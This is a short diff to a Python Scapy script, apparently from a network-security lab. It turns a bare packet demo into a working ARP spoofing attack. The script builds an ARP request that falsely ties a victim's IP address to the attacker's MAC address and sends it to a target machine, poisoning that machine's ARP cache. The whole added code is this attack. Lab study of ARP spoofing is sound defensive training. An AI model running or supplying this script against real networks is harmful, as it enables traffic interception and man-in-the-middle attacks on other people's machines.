@@ -1,11 +1,20 @@
 from scapy.all import *
 
-E = Ether()
-A = ARP()
+VM_IP = "192.168.147.147"
+VM_MAC = "00:0c:29:58:c3:1c"
+VICTIM_IP = "192.168.147.150"
+ATTACKER_MAC = "00:0c:29:91:6f:ba"
 
-packet = E/A
-sendp(packet)
+ether = Ether()
+ether.dst = VM_MAC
+ether.src = ATTACKER_MAC
 
-print(packet)
-print(E)
-print(A)
+arp = ARP()
+arp.psrc = VICTIM_IP
+arp.hwsrc = ATTACKER_MAC
+arp.pdst = VM_IP
+arp.op = 1
+
+frame = ether/arp
+sendp(frame)
+
